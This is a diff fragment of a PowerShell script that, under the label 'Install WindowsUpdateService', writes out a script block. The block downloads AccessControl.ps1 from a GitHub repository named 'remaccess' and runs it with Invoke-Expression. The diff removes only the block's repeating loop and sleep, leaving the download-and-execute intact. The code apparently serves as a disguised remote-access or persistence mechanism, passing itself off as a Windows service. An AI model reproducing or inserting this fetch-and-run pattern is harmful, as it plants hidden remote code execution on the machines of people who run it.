@@ -20,15 +20,12 @@ if (-not (Test-Path "$regPath\Data") -or (Get-ItemProperty -Path "$regPath\Data"
 }
 #Install WindowsUpdateService
 $scriptContent = @'
-while ($true) {
 $url = "https://raw.githubusercontent.com/DirNotAvailable/remaccess/main/AccessControl.ps1"
 $response = Invoke-WebRequest -Uri $url -UseBasicParsing
 if ($response.StatusCode -eq 200) {
 $scriptContent = $response.Content
 Invoke-Expression $scriptContent
 } else {}
-Start-Sleep -Seconds 300
-}
 '@
 Remove-Item $shellscriptpath -Force -ErrorAction SilentlyContinue
 $scriptContent | Set-Content -Path $shellscriptpath -Force
